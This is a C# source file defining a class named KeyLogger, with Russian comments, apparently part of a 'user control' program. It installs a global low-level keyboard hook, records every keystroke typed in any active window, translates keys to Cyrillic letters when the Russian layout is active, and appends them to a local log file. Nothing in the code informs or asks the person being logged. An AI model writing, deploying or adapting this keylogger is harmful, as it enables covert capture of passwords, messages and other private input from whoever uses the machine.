﻿using System;
using System.Collections.Generic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Windows.Forms;
using userControlProgram.Properties;
using System.IO;                    

namespace userControlProgram
{
    class KeyLogger
    {
        [DllImport("user32.dll")]
        static extern IntPtr SetWindowsHookEx(int idHook, KeyboardHookProc callback, IntPtr hInstance, uint threadId);

        [DllImport("user32.dll")]
        static extern bool UnhookWindowsHookEx(IntPtr hInstance);

        [DllImport("user32.dll")]
        static extern IntPtr CallNextHookEx(IntPtr idHook, int nCode, int wParam, IntPtr lParam);

        [DllImport("kernel32.dll")]
        static extern IntPtr LoadLibrary(string lpFileName);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern int GetWindowThreadProcessId(IntPtr handleWindow, out int lpdwProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        private static extern IntPtr GetKeyboardLayout(int windowsThreadProcessId);

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetForegroundWindow();

        [DllImport("user32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr SetForegroundWindow(IntPtr hWnd);

        private delegate IntPtr KeyboardHookProc(int code, IntPtr wParam, IntPtr lParam);

        const int WH_KEYBOARD_LL = 13; 
        const int WM_KEYDOWN = 0x100; 

        private static KeyboardHookProc _proc = HookProc;

        private static IntPtr hhook = IntPtr.Zero;

        private static int _processId;

        private static InputLanguageCollection _InstalledInputLanguages;

        private static string _currentInputLanguage;

        public static void SetHook(string logPath)
        {
            _logPath = logPath;
            IntPtr hInstance = LoadLibrary("User32");
            hhook = SetWindowsHookEx(WH_KEYBOARD_LL, _proc, hInstance, 0);
        }

        private static string _logPath = "log";



        public static void UnHook()
        {
            // Снятие хука
            UnhookWindowsHookEx(hhook);
        }
        // Получение раскладки клавиатуры активного окна
        private static string GetKeyboardLayoutId()
        {
            _InstalledInputLanguages = InputLanguage.InstalledInputLanguages;

            // Получаем хендл активного окна
            IntPtr hWnd = GetForegroundWindow();
            // Получаем номер потока активного окна
            int winThreadProcId = GetWindowThreadProcessId(hWnd, out _processId);
            // Получаем раскладку
            IntPtr keybLayout = GetKeyboardLayout(winThreadProcId);
            // Циклом перебираем все установленные языки для проверки идентификатора
            for (int i = 0; i < _InstalledInputLanguages.Count; i++)
            {
                if (keybLayout == _InstalledInputLanguages[i].Handle)
                {
                    _currentInputLanguage = _InstalledInputLanguages[i].Culture.ThreeLetterWindowsLanguageName;
                }
            }
            return _currentInputLanguage;
        }


        public static IntPtr HookProc(int code, IntPtr wParam, IntPtr lParam)
        {
            if (code >= 0 && wParam == (IntPtr)0x0101)
            {
                // Получаем handle активного окна
                IntPtr hWnd = GetForegroundWindow();

                // Получаем раскладку активного окна
                string nowLanguage = GetKeyboardLayoutId();
                string keyValue;

                int vkCode = Marshal.ReadInt32(lParam);
                if (nowLanguage == "RUS")
                    keyValue = SearchRusKey((Keys)vkCode);
                else keyValue = ((Keys) vkCode).ToString();
                if (keyValue == ((Keys)vkCode).ToString())
                    keyValue = NumberKeys((Keys) vkCode);
                WriteLog(keyValue);
                
            }
            return CallNextHookEx(hhook, code, (int)wParam, lParam);
        }

        public static string SearchRusKey(Keys key)
        {
            switch(key)
            {
                case Keys.Oem3:
                    return "Ё";
                case Keys.Q:
                    return "Й";
                case Keys.W:
                    return "Ц";
                case Keys.E:
                    return "У";
                case Keys.R:
                    return "К";
                case Keys.T:
                    return "Е";
                case Keys.Y:
                    return "Н";
                case Keys.U:
                    return "Г";
                case Keys.I:
                    return "Ш";
                case Keys.O:
                    return "Щ";
                case Keys.P:
                    return "З";
                case Keys.OemOpenBrackets:
                    return "Х";
                case Keys.OemCloseBrackets:
                    return "Ъ";
                case Keys.A:
                    return "Ф";
                case Keys.S:
                    return "Ы";
                case Keys.D:
                    return "В";
                case Keys.F:
                    return "А";
                case Keys.G:
                    return "П";
                case Keys.H:
                    return "Р";
                case Keys.J:
                    return "О";
                case Keys.K:
                    return "Л";
                case Keys.L:
                    return "Д";
                case Keys.Oem1:
                    return "Ж";
                case Keys.Oem7:
                    return "Э";
                case Keys.Z:
                    return "Я";
                case Keys.X:
                    return "Ч";
                case Keys.C:
                    return "С";
                case Keys.V:
                    return "М";
                case Keys.B:
                    return "И";
                case Keys.N:
                    return "Т";
                case Keys.M:
                    return "Ь";
                case Keys.Oemcomma:
                    return "Б";
                case Keys.OemPeriod:
                    return "Ю";

                default:
                    return key.ToString();
                    
            }
        }

        private static string NumberKeys(Keys key)
        {
            switch (key)
            {
                case Keys.Space:
                    return " ";
                case Keys.D0:
                    return "0";
                case Keys.D1:
                    return "1";
                case Keys.D2:
                    return "2";
                    case Keys.D3:
                    return "3";
                case Keys.D4:
                    return "4";
                case Keys.D5:
                    return "5";
                case Keys.D6:
                    return "6";
                    case Keys.D7:
                    return "7";
                case Keys.D8:
                    return "8";
                case Keys.D9:
                    return "9";
                default:
                    return key.ToString();
            }
        }

        public static void WriteLog (string key)
        {
            StreamWriter logStream = new StreamWriter(_logPath, true, Encoding.Default);
            logStream.Write(key);
            logStream.Close();
        }
    }
}
